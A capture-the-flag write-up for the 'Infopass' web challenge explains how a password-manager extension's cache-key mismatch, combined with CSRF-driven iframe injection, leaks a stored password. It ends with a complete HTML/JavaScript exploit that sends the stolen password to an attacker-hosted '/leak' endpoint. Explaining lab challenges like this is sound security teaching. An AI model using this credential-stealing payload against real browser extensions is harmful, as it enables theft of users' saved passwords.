# Infopass

|              |                                                                                             |
| ------------ | ------------------------------------------------------------------------------------------- |
| **CTF**      | [Infobahn CTF 2025](http://2025.infobahnc.tf/) [(CTFtime)](https://ctftime.org/event/2878/) |
| **Author**   | [t-chen](https://github.com/tepel-chen/)                                                    |
| **Category** | web                                                                                         |
| **Solves**   | 2                                                                                           |
| **Files**    | [infopass.zip](./infopass.zip)                                                              |

## Solution

There's a logic bug in `background.js`. The application stores the encrypted password using `sender.origin` as the key, but the cache uses a key derived from `sender.url`:

```javascript
const url = new URL(sender.url);
const path = url.origin + url.pathname;

if (cache.has(path)) {
  return cache.get(path);
}
```

At first glance, it seems that `sender.origin` and `url.origin` would match, so there shouldn't be a problem.
However, this is not always true because `manifest.json` specifies `"match_origin_as_fallback": true`. According to [the Chrome extension documentation](https://developer.chrome.com/docs/extensions/reference/manifest/content-scripts#frames)n:

> "match_origin_as_fallback" - Boolean
> Optional. Defaults to false. Whether the script should inject in frames that were created by a matching origin, but whose URL or origin may not directly match the pattern. These include frames with different schemes, such as about:, data:, blob:, and filesystem:.

This means that if we can create a frame on `https://infopass-web.challs2.infobahnc.tf` that uses a scheme like `about:`, `data:`, `blob:`, or `filesystem:`, the content script will still execute. In such a case, `sender.origin` will be `https://infopass-web.challs2.infobahnc.tf`, but `url` will be a different value (e.g., `about:srcdoc`). This discrepancy is the core of the vulnerability.

The target website has a clear HTML injection vulnerability that can be triggered via CSRF. Although a strong Content Security Policy of `default-src 'none'` prevents JavaScript execution, we can still inject an `<iframe>`.

Therefore, we can obtain the flag with the following steps:

1.  The bot visits the site and saves the password. The extension stores it with the key `https://infopass-web.challs2.infobahnc.tf`.
2.  On our attacker-controlled page, we use CSRF to make the bot render an `<iframe>` with a password field on the vulnerable page, for example: `<iframe srcdoc='&lt;input name&equals;&quot;username&quot;&gt;&lt;input type&equals;&quot;password&quot;&gt;'></iframe>`
3.  The content script's `getCredential` function is invoked because the injected frame contains a password input. Here, `sender.origin` is `https://infopass-web.challs2.infobahnc.tf`, so the extension retrieves the bot's saved password.
4.  `background.js` then caches the password. However, the cache key is generated from `sender.url` which is `about:srcdoc`. `url.origin` will be `null` and `url.pathname` will be `srcdoc`, so the cache key will be `nullsrcdoc`.
5.  On our attacker-controlled page, we create an identical `<iframe>`. The content script runs again.
6.  This time, `sender.url` is also `about:srcdoc`, so the cache key is `nullsrcdoc`. The extension finds the cached password and autofills it into our iframe's password field.
7.  Since this iframe is on our page, we can access its content with JavaScript and read the autofilled password, which is the flag.

### Final payload

Host the following page using [requestrepo](https://requestrepo.com/) or ngrok.

```html
<form method="post" action="http://localhost:1337/" target="lol">
  <input name="username" />
  <br />
  <input name="password" type="password" />
  <br />
  <button type="submit">Register</button>
</form>
<iframe id="iframe"></iframe>
<script>
  const sleep = (s) => new Promise((r) => setTimeout(r, s));
  (async () => {
    const w = open("about:blank", "lol");
    const form = document.forms[0];
    form.username.value = "<iframe srcdoc='&lt;input name&equals;&quot;username&quot;&gt;&lt;input type&equals;&quot;password&quot;&gt;'></iframe>" + Math.random();
    form.password.value = "xxx";
    form.submit();

    await sleep(500);

    const iframe = document.querySelector("#iframe");
    iframe.srcdoc = '<input name="username"><input type="password">';

    await sleep(500);
    document.location.assign("/leak?v=" + iframe.contentDocument.querySelector("input[type=password]").value);
  })();
</script>
```
